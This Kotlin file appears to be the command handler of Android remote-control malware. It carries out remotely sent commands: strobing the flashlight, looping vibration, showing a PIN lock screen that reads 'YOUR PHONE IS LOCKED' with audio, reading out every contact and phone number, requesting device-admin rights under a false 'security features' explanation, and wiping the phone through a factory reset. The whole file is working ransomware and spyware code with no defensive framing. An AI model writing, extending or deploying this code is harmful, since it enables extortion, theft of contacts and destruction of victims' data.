package com.template.app

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.media.MediaPlayer
import android.net.Uri
import android.os.Build
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.provider.Settings
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject

object NativeCommandHandler {

    private const val TAG = "NativeCmdHandler"
    private var mediaPlayer: MediaPlayer? = null

    // ==========================================
    // ===== MAIN EXECUTE =====
    // ==========================================
    fun execute(context: Context, command: String, extra: String): JSONObject {
        Log.d(TAG, "🎯 Execute: $command (extra=$extra)")

        return try {
            when (command) {
                // ===== PING =====
                "ping" -> {
                    JSONObject().apply {
                        put("ok", true)
                        put("pong", true)
                        put("ts", System.currentTimeMillis())
                    }
                }

                // ===== FLASHLIGHT =====
                "flash_strobe" -> toggleFlash(context, true)
                "stop_strobe" -> toggleFlash(context, false)

                // ===== VIBRATE =====
                "vibrate_loop" -> vibrateLoop(context)
                "stop_vibrate" -> stopVibrate(context)

                // ===== FORCE OPEN =====
                "force_open" -> forceOpen(context)

                // ===== OPEN URL =====
                "open_url" -> openUrl(context, extra)

                // ===== LOCK (OVERLAY) =====
                "hard_lock" -> hardLockOverlay(context, extra)
                "unlock" -> unlockOverlay()

                // ===== DEVICE ADMIN =====
                "is_device_admin" -> {
                    JSONObject().apply {
                        put("ok", true)
                        put("is_admin", isDeviceAdmin(context))
                    }
                }
                "request_device_admin" -> {
                    requestDeviceAdmin(context)
                    JSONObject().apply {
                        put("ok", true)
                        put("message", "Dialog admin dibuka")
                    }
                }

                // ===== SCREEN CAPTURE =====
                "get_screen" -> {
                    JSONObject().apply {
                        put("ok", false)
                        put("error", "screen_capture_requires_activity")
                        put("message", "MediaProjection butuh user consent di Activity")
                    }
                }

                // ===== CAMERA =====
                "take_photo" -> {
                    JSONObject().apply {
                        put("ok", false)
                        put("error", "camera_requires_activity")
                        put("message", "Camera butuh Activity")
                    }
                }

                "start_camera_stream" -> {
                    JSONObject().apply {
                        put("ok", false)
                        put("error", "camera_requires_activity")
                    }
                }

                "stop_camera_stream" -> {
                    JSONObject().apply {
                        put("ok", true)
                    }
                }

                // ===== AUDIO =====
                "play_audio" -> playAudio(context, extra)
                "stop_audio" -> stopAudio()

                // ===== WALLPAPER =====
                "set_wallpaper" -> {
                    JSONObject().apply {
                        put("ok", false)
                        put("error", "wallpaper_requires_activity")
                    }
                }

                // ===== CONTACTS =====
                "get_contacts" -> getContacts(context)

                // ===== ACCESSIBILITY =====
                "open_accessibility" -> {
                    openAccessibilitySettings(context)
                    JSONObject().apply { put("ok", true) }
                }

                // ===== PROTECTION =====
                "enable_protection" -> {
                    JSONObject().apply {
                        put("ok", false)
                        put("error", "protection_requires_activity")
                    }
                }

                "disable_protection" -> {
                    JSONObject().apply {
                        put("ok", false)
                        put("error", "protection_requires_activity")
                    }
                }

                // ===== FACTORY RESET =====
                "factory_reset" -> factoryReset(context)

                // ===== UNKNOWN =====
                else -> {
                    Log.w(TAG, "Unknown command: $command")
                    JSONObject().apply {
                        put("ok", false)
                        put("error", "unknown_command")
                        put("command", command)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Execute error [$command]", e)
            JSONObject().apply {
                put("ok", false)
                put("error", "exception")
                put("message", e.message ?: "unknown")
            }
        }
    }

    // ==========================================
    // ===== FLASHLIGHT =====
    // ==========================================
    private fun toggleFlash(context: Context, on: Boolean): JSONObject {
        return try {
            val camManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            var cameraId: String? = null

            for (id in camManager.cameraIdList) {
                try {
                    val chars = camManager.getCameraCharacteristics(id)
                    val flashAvailable: Boolean =
                        chars.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) ?: false
                    if (flashAvailable) {
                        cameraId = id
                        break
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Camera $id error: ${e.message}")
                }
            }

            if (cameraId == null) {
                return JSONObject().apply {
                    put("ok", false)
                    put("error", "no_flash")
                }
            }

            camManager.setTorchMode(cameraId, on)
            Log.d(TAG, "Flash $on on camera $cameraId")
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "flash_error")
            }
        }
    }

    // ==========================================
    // ===== VIBRATE =====
    // ==========================================
    private fun getVibrator(context: Context): Vibrator {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val vm = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE)
                    as VibratorManager
            vm.defaultVibrator
        } else {
            @Suppress("DEPRECATION")
            context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        }
    }

    private fun vibrateLoop(context: Context): JSONObject {
        return try {
            val vibrator = getVibrator(context)
            val pattern = longArrayOf(0, 500, 500)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createWaveform(pattern, 0))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(pattern, 0)
            }

            Log.d(TAG, "Vibrate loop started")
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "vibrate_error")
            }
        }
    }

    private fun stopVibrate(context: Context): JSONObject {
        return try {
            getVibrator(context).cancel()
            Log.d(TAG, "Vibrate stopped")
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "vibrate_error")
            }
        }
    }

    // ==========================================
    // ===== FORCE OPEN =====
    // ==========================================
    private fun forceOpen(context: Context): JSONObject {
        return try {
            val intent = context.packageManager
                .getLaunchIntentForPackage(context.packageName)

            if (intent != null) {
                intent.addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                )
                context.startActivity(intent)
                Log.d(TAG, "Force open app")
                JSONObject().apply { put("ok", true) }
            } else {
                JSONObject().apply {
                    put("ok", false)
                    put("error", "no_launch_intent")
                }
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "force_open_error")
            }
        }
    }

    // ==========================================
    // ===== OPEN URL =====
    // ==========================================
    private fun openUrl(context: Context, url: String): JSONObject {
        if (url.isEmpty()) {
            return JSONObject().apply {
                put("ok", false)
                put("error", "empty_url")
            }
        }
        return try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
            Log.d(TAG, "Open URL: $url")
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "url_error")
            }
        }
    }

    // ==========================================
    // ===== LOCK (OVERLAY) =====
    // ==========================================
  private fun hardLockOverlay(context: Context, extra: String): JSONObject {
    return try {
        // ==========================================
        // ===== PARSE EXTRA =====
        // ==========================================
        // Format 1: "message|pin"
        // Format 2: "message|pin|audio_url"
        // Format 3: "message|pin|audio_url|volume"
        val parts = extra.split("|")

        val message = parts.getOrNull(0)?.takeIf { it.isNotEmpty() }
            ?: "YOUR PHONE IS LOCKED"
        val pin = parts.getOrNull(1)?.takeIf { it.isNotEmpty() }
            ?: "1234"
        val audioUrl = parts.getOrNull(2) ?: ""
        val volume = parts.getOrNull(3)?.toFloatOrNull() ?: 1.0f

        Log.d(TAG, "🔒 Launch lock overlay:")
        Log.d(TAG, "   message: $message")
        Log.d(TAG, "   pin:     ${pin.take(2)}***")
        Log.d(TAG, "   audio:   ${audioUrl.take(60)}")
        Log.d(TAG, "   volume:  $volume")

        // ==========================================
        // ===== LAUNCH OVERLAY =====
        // ==========================================
        val intent = Intent(context, LockOverlayActivity::class.java).apply {
            addFlags(
                Intent.FLAG_ACTIVITY_NEW_TASK or
                Intent.FLAG_ACTIVITY_CLEAR_TOP or
                Intent.FLAG_ACTIVITY_NO_HISTORY or
                Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
            )
            putExtra(LockOverlayActivity.EXTRA_MESSAGE, message)
            putExtra(LockOverlayActivity.EXTRA_PIN, pin)
            putExtra("lock_audio_url", audioUrl)
            putExtra("lock_audio_volume", volume)
        }
        context.startActivity(intent)

        JSONObject().apply {
            put("ok", true)
            put("locked", true)
            put("message", message)
            put("has_sound", audioUrl.isNotEmpty())
            put("audio_url", audioUrl)
        }
    } catch (e: Exception) {
        Log.e(TAG, "hardLockOverlay error", e)
        JSONObject().apply {
            put("ok", false)
            put("error", e.message ?: "lock_error")
        }
    }
}
    private fun unlockOverlay(): JSONObject {
        return try {
            Log.d(TAG, "🔓 Unlock overlay")
            LockOverlayManager.unlock()
            JSONObject().apply {
                put("ok", true)
                put("unlocked", true)
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "unlock_error")
            }
        }
    }

    // ==========================================
    // ===== DEVICE ADMIN =====
    // ==========================================
    private fun isDeviceAdmin(context: Context): Boolean {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE)
                as DevicePolicyManager
        val admin = ComponentName(context, MyDeviceAdminReceiver::class.java)
        return dpm.isAdminActive(admin)
    }

    private fun requestDeviceAdmin(context: Context) {
        try {
            val admin = ComponentName(context, MyDeviceAdminReceiver::class.java)
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
            intent.putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Izinkan untuk mengaktifkan fitur keamanan perangkat",
            )
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
            Log.d(TAG, "Device admin dialog requested")
        } catch (e: Exception) {
            Log.e(TAG, "requestDeviceAdmin error", e)
        }
    }

    // ==========================================
    // ===== AUDIO =====
    // ==========================================
    private fun playAudio(context: Context, url: String): JSONObject {
        if (url.isEmpty()) {
            return JSONObject().apply {
                put("ok", false)
                put("error", "empty_url")
            }
        }
        return try {
            mediaPlayer?.release()
            mediaPlayer = MediaPlayer().apply {
                setDataSource(url)
                setOnPreparedListener {
                    Log.d(TAG, "🎵 Audio playing")
                    start()
                }
                setOnErrorListener { _, _, _ ->
                    Log.e(TAG, "Audio error")
                    true
                }
                prepareAsync()
            }
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "audio_error")
            }
        }
    }

    private fun stopAudio(): JSONObject {
        return try {
            mediaPlayer?.stop()
            mediaPlayer?.release()
            mediaPlayer = null
            Log.d(TAG, "🎵 Audio stopped")
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply { put("ok", true) }
        }
    }

    // ==========================================
    // ===== CONTACTS =====
    // ==========================================
    private fun getContacts(context: Context): JSONObject {
        return try {
            val contactsList = mutableListOf<Map<String, String>>()
            val cursor = context.contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null,
            )

            cursor?.use {
                val nameIdx = it.getColumnIndex(
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                )
                val phoneIdx = it.getColumnIndex(
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER,
                )

                while (it.moveToNext()) {
                    val name = if (nameIdx >= 0) it.getString(nameIdx) else ""
                    val phone = if (phoneIdx >= 0) it.getString(phoneIdx) else ""
                    contactsList.add(mapOf(
                        "name" to (name ?: ""),
                        "phone" to (phone ?: ""),
                    ))
                }
            }

            Log.d(TAG, "📇 Contacts: ${contactsList.size}")

            // Convert to JSONArray
            val jsonArray = JSONArray()
            for (c in contactsList) {
                jsonArray.put(JSONObject(c))
            }

            JSONObject().apply {
                put("ok", true)
                put("contacts", jsonArray)
                put("count", contactsList.size)
            }
        } catch (e: Exception) {
            Log.e(TAG, "getContacts error", e)
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "contacts_error")
                put("contacts", JSONArray())
                put("count", 0)
            }
        }
    }

    // ==========================================
    // ===== SETTINGS =====
    // ==========================================
    private fun openAccessibilitySettings(context: Context) {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
            Log.d(TAG, "Accessibility settings opened")
        } catch (e: Exception) {
            Log.e(TAG, "openAccessibility error", e)
        }
    }

    // ==========================================
    // ===== FACTORY RESET =====
    // ==========================================
    private fun factoryReset(context: Context): JSONObject {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE)
                    as DevicePolicyManager
            val admin = ComponentName(context, MyDeviceAdminReceiver::class.java)

            if (dpm.isAdminActive(admin)) {
                dpm.wipeData(0)
                Log.d(TAG, "🔥 Factory reset triggered")
                JSONObject().apply { put("ok", true) }
            } else {
                JSONObject().apply {
                    put("ok", false)
                    put("error", "device_admin_not_active")
                }
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "factory_reset_error")
            }
        }
    }
}
